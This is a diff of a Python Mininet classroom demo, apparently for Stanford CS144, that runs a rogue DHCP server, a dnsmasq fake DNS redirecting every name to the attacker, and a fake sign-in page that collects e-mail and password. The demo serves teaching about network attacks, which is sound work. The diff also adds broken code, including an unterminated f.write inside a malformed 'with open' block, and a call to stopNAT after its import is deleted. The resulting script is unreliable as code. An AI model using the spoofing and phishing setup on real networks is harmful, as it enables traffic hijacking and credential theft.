@@ -1,26 +1,20 @@
-#!/usr/bin/python3
-
+#!/usr/bin/env python3
 """
 Rogue DHCP server demo for Stanford CS144.
-
 We set up a network where the DHCP server is on a slow
 link. Then we start up a rogue DHCP server on a fast
 link which should beat it out (although we should look
 at wireshark for the details.) This rogue DHCP server
 redirects DNS to a rogue DNS server, which redirects
 all DNS queries to the attacker. Hilarity ensues.
-
 The demo supports two modes: the default interactive
 mode (X11/firefox) or a non-interactive "text" mode
 (text/curl).
-
 We could also do the whole thing without any custom
 code at all, simply by using ettercap.
-
 Note you may want to arrange your windows so that
 you can see everything well.
 """
-
 from mininet.net import Mininet
 from mininet.topo import Topo
 from mininet.link import TCLink
@@ -28,13 +22,9 @@ from mininet.cli import CLI
 from mininet.util import quietRun
 from mininet.log import setLogLevel, info
 from mininet.term import makeTerms
-from mininet.examples.nat import connectToInternet, stopNAT
-
 from sys import exit, stdin, argv
-from re import findall
 from time import sleep
 import os
-
 def checkRequired():
     "Check for required executables"
     required = ['udhcpd', 'udhcpc', 'dnsmasq', 'curl', 'firefox']
@@ -45,13 +35,11 @@ def checkRequired():
             if r == 'dnsmasq':
                 # Don't run dnsmasq by default!
                 print(quietRun('update-rc.d dnsmasq disable'))
-
 class DHCPTopo(Topo):
     """Topology for DHCP Demo:
        client - switch - slow link - DHCP server
                   |
                 attacker"""
-
     def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
         client = self.addHost('h1', ip='10.0.0.10/24')
@@ -61,20 +49,16 @@ class DHCPTopo(Topo):
         self.addLink(client, switch)
         self.addLink(evil, switch)
         self.addLink(dhcp, switch, bw=10, delay='500ms')
-
-
 # DHCP server functions and data
-
 DNSTemplate = """
-start		10.0.0.10
-end		10.0.0.90
-option	subnet	255.255.255.0
-option	domain	local
-option	lease	7  # seconds
+start        10.0.0.10
+end          10.0.0.90
+option       subnet 255.255.255.0
+option       domain local
+option       lease 7  # seconds
 """
 # option dns 8.8.8.8
 # interface h1-eth0
-
 def makeDHCPconfig(filename, intf, gw, dns):
     "Create a DHCP configuration file"
     config = (
@@ -85,7 +69,6 @@ def makeDHCPconfig(filename, intf, gw, dns):
         '')
     with open(filename, 'w') as f:
         f.write('\n'.join(config))
-
 def startDHCPserver(host, gw, dns):
     "Start DHCP server on host with specified DNS server"
     info('* Starting DHCP server on', host, 'at', host.IP(), '\n')
@@ -93,24 +76,18 @@ def startDHCPserver(host, gw, dns):
     makeDHCPconfig(dhcpConfig, host.defaultIntf(), gw, dns)
     host.cmd('udhcpd -f', dhcpConfig,
              '1>/tmp/%s-dhcp.log 2>&1  &' % host)
-
 def stopDHCPserver(host):
     "Stop DHCP server on host"
     info('* Stopping DHCP server on', host, 'at', host.IP(), '\n')
     host.cmd('kill %udhcpd')
-
-
 # DHCP client functions
-
 def startDHCPclient(host):
     "Start DHCP client on host"
     intf = host.defaultIntf()
     host.cmd('dhclient -v -d -r', intf)
     host.cmd('dhclient -v -d 1> /tmp/dhclient.log 2>&1', intf, '&')
-
 def stopDHCPclient(host):
     host.cmd('kill %dhclient')
-
 def waitForIP(host):
     "Wait for an IP address"
     info('*', host, 'waiting for IP address')
@@ -122,61 +99,50 @@ def waitForIP(host):
         sleep(1)
     info('\n')
     info('*', host, 'is now using',
-         host.cmd('grep nameserver /etc/resolv.conf'))
-
+          host.cmd('grep nameserver /etc/resolv.conf'))
 # Fake DNS server
-
 def startFakeDNS(host):
     "Start Fake DNS server"
     info('* Starting fake DNS server', host, 'at', host.IP(), '\n')
     host.cmd('dnsmasq -k -A /#/%s 1>/tmp/dns.log 2>&1 &' % host.IP())
-
 def stopFakeDNS(host):
     "Stop Fake DNS server"
     info('* Stopping fake DNS server', host, 'at', host.IP(), '\n')
     host.cmd('kill %dnsmasq')
-
 # Evil web server
-
 def startEvilWebServer(host):
     "Start evil web server"
     info('* Starting web server', host, 'at', host.IP(), '\n')
     webdir = '/tmp/evilwebserver'
     host.cmd('rm -rf', webdir)
     host.cmd('mkdir -p', webdir)
+    with open(webdir + '/index.html', 'w'):
+        f.write('<html><p>Haha! You have been hacked! Please sign in.<p>\n'
     with open(webdir + '/index.html', 'w') as f:
-        # If we wanted to be truly evil, we could add this
-        # to make it hard to retype URLs in firefox
-        # f.write( '<meta http-equiv="refresh" content="1"> \n' )
         f.write('<html><p>You have been pwned! Please sign in.<p>\n'
                 '<body><form action="">\n'
                 'e-mail: <input type="text" name="firstname"><br>\n'
                 'password: <input type="text" name="firstname"><br>\n'
                 '</form></body></html>')
     host.cmd('cd', webdir)
-    host.cmd('python -m http.server 80 >& /tmp/http.log &')
+    host.cmd('python3 -m http.server 80 >& /tmp/http.log &')
+
 
 def stopEvilWebServer(host):
     "Stop evil web server"
     info('* Stopping web server', host, 'at', host.IP(), '\n')
     host.cmd('kill %python')
-
-
 # Some other potentially useful code if we want to
 # make this an interactive demo.
-
 def readline():
     "Read a line from stdin"
     return stdin.readline()
-
-
 def prompt(s=None):
     "Print a prompt and read a line from stdin"
     if s is None:
         s = "Press return to continue: "
-    print(s, end='')
+    print(s, end=' ')
     return readline()
-
 def mountPrivateResolvconf(host):
     "Create/mount private /etc/resolv.conf for host"
     etc = '/tmp/etc-%s' % host
@@ -186,14 +152,18 @@ def mountPrivateResolvconf(host):
     host.cmd('ln -s %s/* /etc/' % etc)
     host.cmd('rm /etc/resolv.conf')
     host.cmd('cp %s/resolv.conf /etc/' % etc)
-
 def unmountPrivateResolvconf(host):
     "Unmount private /etc dir for host"
     etc = '/tmp/etc-%s' % host
     host.cmd('umount /etc')
     host.cmd('umount', etc)
     host.cmd('rmdir', etc)
-
+def connectToInternet(network, switch):
+    "Connect the network to the internet"
+    switch = network.get(switch)
+    switch.cmd("sysctl -w net.ipv4.ip_forward=1")
+    switch.cmd("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
+    return switch
 def dhcpdemo(firefox=True):
     "Rogue DHCP server demonstration"
     checkRequired()
@@ -251,18 +221,7 @@ def dhcpdemo(firefox=True):
     stopNAT(rootnode)
     unmountPrivateResolvconf(h1)
     net.stop()
-
-def usage():
-    "Print usage message"
-    print("%s [ -h | -text ]")
-    print("-h: print this message")
-    print("-t: run in text/batch vs. firefox/x11 mode")
-
-
+# Run the dhcpdemo function when the script is executed
 if __name__ == '__main__':
     setLogLevel('info')
-    if '-h' in argv:
-        usage()
-        exit(1)
-    firefox = '-t' not in argv
-    dhcpdemo(firefox=firefox)
+    dhcpdemo()
